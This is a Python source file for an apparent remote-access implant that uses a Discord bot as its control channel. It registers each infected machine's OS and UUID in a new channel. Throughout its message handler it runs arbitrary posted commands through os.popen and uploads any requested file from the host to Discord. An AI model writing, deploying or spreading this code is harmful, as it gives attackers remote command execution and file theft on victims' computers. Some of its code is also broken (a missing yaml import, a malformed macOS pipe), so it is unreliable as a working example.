import config
import discord
from discord.ext import commands
import os
import platform
import subprocess
import sys

bot = commands.Bot(command_prefix=".")

channel = None

@bot.event
async def on_ready():
    # Get server name
    guild = bot.get_guild(server_id)

    # Create 'SierraOne' category
    category = await create_category(guild)

    # Get a list of the text channels in the server
    channels = guild.text_channels

    global channel

    # Create 'sierra-hotel-'
    channel = await create_channel(category, channels)

    # Get the machine info
    info = await machine_info()

    # Send the machine info to 'sierra-hotel-'
    # Remove 'embed=info' if you want to use the alternative
    send_info = await channel.send(embed=info)

    # Pin the machine info to 'sierra-hotel-'
    await send_info.pin()


# Create 'SierraOne' category
async def create_category(guild):
    category = discord.utils.get(guild.categories, name=category_prefix)

    if not category:
        category = await guild.create_category(category_prefix)

    return category


# Create 'sierra-hotel-'
async def create_channel(category, channels):
    shell_number = await next_channel(channels)

    new_channel = await category.create_text_channel(channel_prefix + str(shell_number))

    return new_channel


# Number 'sierra-hotel-'
async def next_channel(channels):
    numbers = []
    shell_number = 0

    try:
        for channel in channels:
            name = channel.name
            if channel_prefix in name:
                channel_number = name.split("-")[2]
                if channel_number.isdigit():
                    numbers.append(int(channel_number))

        return max(numbers) + 1

    except ValueError:
        return shell_number + 1

    return shell_number


# Get the machine info
async def machine_info():
    if platform.system() == "Windows":
        machine_UUID = str(subprocess.check_output("wmic csproduct get UUID"))
    elif platform.system() == "Linux":
        machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
    elif platform.system() == "Darwin":
        machine_UUID = str(subprocess.check_output(["ioreg",
                                                    "-d2",
                                                    "-c",
                                                    "IOPlatformExpertDevice",
                                                    "|",
                                                    "awk",
                                                    "-F",
                                                    "'/IOPlatformUUID/{print $(NF-1)}'"
                                                   ])
                           )
    else:
        machine_UUID = str("Unknown")

    message = discord.Embed(title="Machine Info", type="rich")
    message.add_field(name="Operating System", value=platform.system())
    message.add_field(name="UUID", value=machine_UUID)
    
    # Non-embed alternative
    # message = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."

    return message


@bot.event
async def on_message(message):
    if message.author.id == bot.user.id:
        return
    else:
        await shell_input(channel, message)


async def shell_input(channel, message):
    # Checks if the message was sent to 'sierra-hotel-'
    if message.channel == channel:
        # Check if the message content starts with "upload"
        if message.content.startswith("upload"):
            try:
                # Upload the requested file
                output = await message.channel.send(file=discord.File(message.content[7:]))
            
            except FileNotFoundError:
                # Notify the user if the requested file was not found
                await message.channel.send("File not found")

        elif message.content.startswith("cd"):
            # Change directories
            os.chdir(message.content[3:])

            # Notify the user of the directory change
            await message.channel.send("`cd` complete")

        # Check if the message content starts with "shell_exit"
        elif message.content.startswith("shell_exit"):
            # Delete the room that the command was invoked in
            await message.channel.delete()

            # Close the shell
            sys.exit(0)

        else:
            try:
                # Try to read the user's input
                user_input = os.popen(message.content).read()
            
            except:
                print("OS POPEN exception!")
            
            if user_input == "":
                await message.channel.send("The command did not return anything")
            else:
                await message.channel.send(f"```{user_input}```")
    
    else:
        return


# Open 'config.yaml'
with open("config.yaml") as file:
    settings = yaml.load(file, Loader=yaml.FullLoader)

# Server ID
server_id = config.server_id

# Category prefix
category_prefix = config.category_prefix

# Channel prefix
channel_prefix = config.channel_prefix

bot.run(config.bot_token)
